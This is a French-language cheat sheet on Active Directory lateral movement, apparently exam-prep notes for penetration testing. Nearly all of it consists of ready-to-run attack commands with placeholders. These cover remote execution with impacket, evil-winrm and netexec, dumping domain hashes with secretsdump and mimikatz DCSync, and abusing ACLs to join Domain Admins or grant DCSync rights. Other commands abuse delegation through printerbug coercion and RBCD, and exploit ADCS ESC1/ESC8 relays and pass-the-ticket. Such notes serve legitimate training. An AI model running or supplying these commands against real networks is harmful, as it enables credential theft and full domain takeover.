# 22 — Lateral Movement in Active Directory

## Objectifs
Se déplacer d'hôte en hôte avec les creds obtenus : exécution distante, DCSync, abus d'ACL, délégations, ADCS.

---

## 1. Choisir la méthode

| Méthode | Port | Bruit | Remarque |
|---|---|---|---|
| `psexec` | 445 | élevé | crée un service, SYSTEM |
| `smbexec` | 445 | moyen | pas de binaire déposé |
| `wmiexec` | 135/445 | moyen | semi-interactif |
| `atexec` | 445 | moyen | tâche planifiée |
| `evil-winrm` | 5985/5986 | faible | interactif, idéal |
| RDP | 3389 | faible | session graphique |
| `ssh` (OpenSSH Win) | 22 | faible | si installé |
| `winrs` | 5985 | faible | natif |

```bash
# Vérifier l'accès
netexec smb <TARGET> -u <USER> -p <PASS>
netexec winrm <TARGET> -u <USER> -p <PASS>
```

---

## 2. Exécution distante

```bash
# PsExec (SYSTEM)
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-psexec -hashes :<NTHASH> <DOMAIN>/<USER>@<TARGET>

# WMI (pas de service, pas de binaire)
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET> "whoami"

# SMBExec
impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>

# AtExec (tâche planifiée)
impacket-atexec <DOMAIN>/<USER>:<PASS>@<TARGET> "whoami"

# WinRM
evil-winrm -i <TARGET> -u <USER> -p <PASS>
evil-winrm -i <TARGET> -u <USER> -H <NTHASH>
```

```bash
# netexec : exécution en masse
netexec smb 10.10.10.0/24 -u <USER> -p <PASS> -x "whoami"
netexec smb 10.10.10.0/24 -u <USER> -p <PASS> -X "Get-Process"
netexec winrm 10.10.10.0/24 -u <USER> -p <PASS> -x "whoami"
```

```cmd
:: Natif Windows
PsExec.exe \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd.exe
winrs -r:<TARGET> -u:<USER> -p:<PASS> cmd
schtasks /s <TARGET> /create /tn x /tr "cmd /c whoami" /sc once /st 00:00
```

---

## 3. DCSync

Nécessite `Replicating Directory Changes` (souvent : Domain Admins, Administrators, comptes avec droits délégués).

```bash
# Vérifier les droits dans BloodHound : "Find Principals with DCSync Rights"
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm

# Cibler krbtgt / Administrator
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt
```

```powershell
# Mimikatz
lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\krbtgt
```

---

## 4. Abus d'ACL

| Droit | Action |
|---|---|
| `GenericAll` sur un user | reset password / targeted kerberoast |
| `GenericAll` sur un groupe | s'ajouter au groupe |
| `GenericWrite` sur un user | SPN → kerberoast, ou logon script |
| `WriteDACL` | s'accorder DCSync |
| `WriteOwner` | prendre possession puis WriteDACL |
| `ForceChangePassword` | changer le mdp |
| `AddMember` | ajouter un membre |

```bash
# Ajouter un membre à un groupe (net rpc)
net rpc group addmem "Domain Admins" <USER> -U <DOMAIN>/<USER>%<PASS> -S <DC_IP>

# Délégation de contrôle complète sur un user
impacket-dacledit -action write -rights FullControl -principal <USER> -target <TARGET_USER> <DOMAIN>/<USER>:<PASS>

# Reset de mot de passe
net rpc password <TARGET_USER> 'NewPass123!' -U <DOMAIN>/<USER>%<PASS> -S <DC_IP>

# WriteDACL → DCSync
impacket-dacledit -action write -rights DCSync -principal <USER> -target-dn "DC=<DOMAIN>,DC=local" <DOMAIN>/<USER>:<PASS>

# Targeted Kerberoast (GenericWrite)
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request-user <TARGET_USER>
```

```powershell
# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members <USER>
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='fake/evil'}
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

---

## 5. Délégations

### Unconstrained
Le service stocke les TGT des utilisateurs qui s'y connectent.

```bash
# Trouver
impacket-findDelegation <DOMAIN>/<USER>:<PASS>
# BloodHound : "Shortest Paths to Unconstrained Delegation Systems"

# Coercition + capture
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<DELEG_SERVER> <LHOST>
# En parallèle : Rubeus monitor / ptT

# Ou via ntlmrelayx
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access
```

### Constrained
```bash
# S4U2Self + S4U2Proxy
impacket-getST -spn <SPN>/<TARGET> -impersonate Administrator <DOMAIN>/<USER>:<PASS>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET>
```

### RBCD (Resource-Based Constrained Delegation)
```bash
# Écrire msDS-AllowedToActOnBehalfOfOtherIdentity sur la cible
impacket-rbcd -delegate-from <MACHINE_ACCOUNT>$ -delegate-to <TARGET>$ -action write <DOMAIN>/<USER>:<PASS>
impacket-getST -spn cifs/<TARGET> -impersonate Administrator <DOMAIN>/<MACHINE_ACCOUNT>$:<PASS>
```

---

## 6. ADCS (ESC1, ESC8…)

```bash
# Énumérer
certipy-ad find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout

# ESC1 : template permet un SAN arbitraire
certipy-ad req -u <USER>@<DOMAIN> -p <PASS> -ca <CA> -template <TEMPLATE> \
  -upn administrator@<DOMAIN> -dc-ip <DC_IP>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>

# ESC8 : relais NTLM vers HTTP enrollment
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## 7. Mouvement sans mot de passe

```bash
# Session tokens (si admin sur une machine)
# Extraire les tickets : Rubeus dump / mimikatz sekurlsa::tickets
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

---

## 8. Objectifs de l'examen

```
1. Compromettre un premier hôte (web/SMB/RDP)
2. Énumérer AD (BloodHound)
3. Trouver un chemin vers Domain Admin
4. Prouver l'accès (DC, proof.txt)
5. Documenter chaque étape
```

Ne pas détruire : pas de `rm`, pas de changement de mdp de comptes critiques sans nécessité, pas de persistance non demandée.

---

## 9. Checklist

- [ ] Accès distant confirmé (SMB/WinRM/RDP)
- [ ] BloodHound relu après chaque nouvel accès
- [ ] DCSync testé si droits
- [ ] ACL abusées (GenericAll, WriteDACL…)
- [ ] Délégations examinées
- [ ] ADCS énuméré
- [ ] Creds/hashes réutilisés sur tout le domaine
- [ ] Preuve DA obtenue
- [ ] Timeline notée
